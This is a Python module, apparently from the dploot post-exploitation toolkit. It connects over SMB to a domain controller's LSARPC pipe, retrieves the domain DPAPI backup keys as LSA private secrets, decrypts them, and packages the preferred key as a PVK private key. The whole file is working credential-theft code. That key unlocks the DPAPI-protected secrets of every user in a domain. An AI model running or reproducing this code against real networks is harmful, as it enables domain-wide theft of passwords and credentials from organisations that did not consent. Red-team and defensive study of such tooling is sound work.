import struct

from impacket.dcerpc.v5 import transport
from impacket import crypto
from impacket.uuid import bin_to_string
from impacket.dcerpc.v5 import lsad
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE
from impacket.dpapi import P_BACKUP_KEY, PREFERRED_BACKUP_KEY, PVK_FILE_HDR

from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection

class Backupkey:
    def __init__(self, backupkey_v1, pvk_header, pvk_data):
        self.backupkey_v1 = backupkey_v1
        self.pvk_header = pvk_header
        self.pvk_data = pvk_data
        self.backupkey_v2 = self.pvk_header.getData() + self.pvk_data

class BackupkeyTriage:

    def __init__(self, target: Target, conn: DPLootSMBConnection) -> None:
        self.target = target
        self.conn = conn
        
        self.dce = None
        self._users = None

    def connect(self) -> None:
        rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
        rpctransport.set_smb_connection(self.conn.smb_session)
        self.dce = rpctransport.get_dce_rpc()
        if self.target.do_kerberos:
            self.dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        try:
            self.dce.connect()
            self.dce.bind(lsad.MSRPC_UUID_LSAD)
        except transport.DCERPCException as e:
            raise e
        
    def triage_backupkey(self) -> None:
        
        if self.dce is None:
            self.connect()

        resp = lsad.hLsarOpenPolicy2(self.dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
        backupkey_v1 = None
        pvk_header = None
        pvk_data  = None
        for keyname in ("G$BCKUPKEY_PREFERRED", "G$BCKUPKEY_P"):
            buffer = crypto.decryptSecret(self.conn.smb_session.getSessionKey(), lsad.hLsarRetrievePrivateData(self.dce,
                                            resp['PolicyHandle'], keyname))
            guid = bin_to_string(buffer)
            name = "G$BCKUPKEY_{}".format(guid)
            secret = crypto.decryptSecret(self.conn.smb_session.getSessionKey(), lsad.hLsarRetrievePrivateData(self.dce,
                                            resp['PolicyHandle'], name))
            keyVersion = struct.unpack('<L', secret[:4])[0]
            if keyVersion == 1:  # legacy key
                backup_key = P_BACKUP_KEY(secret)
                backupkey_v1 = backup_key['Data']

            elif keyVersion == 2:  # preferred key
                backup_key = PREFERRED_BACKUP_KEY(secret)
                pvk = backup_key['Data'][:backup_key['KeyLength']]
                pvk_data = pvk
                header = PVK_FILE_HDR()
                header['dwMagic'] = 0xb0b5f11e
                header['dwVersion'] = 0
                header['dwKeySpec'] = 1
                header['dwEncryptType'] = 0
                header['cbEncryptData'] = 0
                header['cbPvk'] = backup_key['KeyLength']
                pvk_header = header

        return Backupkey(
            backupkey_v1=backupkey_v1,
            pvk_header=pvk_header,
            pvk_data=pvk_data
        )